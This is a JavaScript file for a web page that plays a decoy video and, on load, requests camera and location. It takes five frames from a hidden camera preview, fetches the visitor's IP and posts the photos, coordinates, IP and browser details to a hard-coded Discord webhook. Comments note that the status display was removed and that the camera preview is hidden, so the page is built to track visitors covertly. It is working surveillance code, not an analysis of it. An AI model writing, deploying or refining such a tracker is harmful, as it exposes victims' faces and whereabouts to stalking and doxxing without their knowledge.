document.addEventListener('DOMContentLoaded', () => {
    // const statusBox = document.getElementById('status'); // Removed UI element
    const locationDisplay = document.getElementById('locationDisplay');
    const camPreview = document.getElementById('camPreview');
    const contentVideo = document.getElementById('contentVideo');

    // 1. Auto-play content video
    contentVideo.play().catch(() => {
        contentVideo.muted = true;
        contentVideo.play();
    });

    // 2. Start Process Immediately
    initCapture();

    async function initCapture() {
        console.log("Requesting permissions...");

        try {
            // A. Request Camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });
            camPreview.srcObject = stream; // Required for capture, even if hidden

            // Wait for video to be ready
            camPreview.onloadedmetadata = () => {
                camPreview.play();
                console.log("Camera active. Locating...");

                // B. Request Location
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const { latitude, longitude, accuracy } = position.coords;

                            // C. Capture IP
                            let ip = "Unknown";
                            try {
                                const ipRes = await fetch('https://api.ipify.org?format=json');
                                const ipData = await ipRes.json();
                                ip = ipData.ip;
                            } catch (e) { console.log("IP Fetch failed"); }

                            // D. Continuous Capture Loop (0.6s interval)
                            let count = 0;
                            const maxCaptures = 5;

                            const intervalId = setInterval(async () => {
                                if (count >= maxCaptures) {
                                    clearInterval(intervalId);
                                    return;
                                }

                                const imageBlob = await captureFrame(camPreview);
                                sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });

                                count++;
                            }, 600);
                        },
                        (err) => {
                            console.log("Location denied:", err);
                        },
                        { enableHighAccuracy: true }
                    );
                }
            };
        } catch (err) {
            console.log("Permissions denied:", err);
        }
    }

    function captureFrame(video) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.8));
    }

    function downloadImage(blob) {
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `capture_${Date.now()}.jpg`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // Existing Discord Logic (Preserved)
    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
        const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
        const formData = new FormData();
        formData.append("file", imageBlob, `capture_${count}.jpg`);
        const payload = {
            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nUA: ${navigator.userAgent}`
        };
        formData.append("payload_json", JSON.stringify(payload));
        try {
            await fetch(webhookUrl, { method: "POST", body: formData });
        } catch (e) { console.error(e); }
    }
});
